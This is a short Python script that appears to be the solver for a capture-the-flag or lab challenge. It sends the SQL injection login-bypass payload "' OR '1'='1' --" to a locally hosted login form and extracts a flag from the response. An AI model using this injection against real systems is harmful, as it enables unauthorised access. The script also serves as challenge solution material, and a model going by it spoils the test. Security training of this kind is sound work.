import re
import sys

import requests


def main():
    base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8103"
    payload = "' OR '1'='1' --"
    response = requests.post(
        base + "/",
        data={"username": payload, "password": "anything"},
        timeout=5,
    )
    flag = re.search(r"UNKNOWN\{[^}]+\}", response.text)
    if not flag:
        raise SystemExit("flag not found")
    print(flag.group(0))


if __name__ == "__main__":
    main()
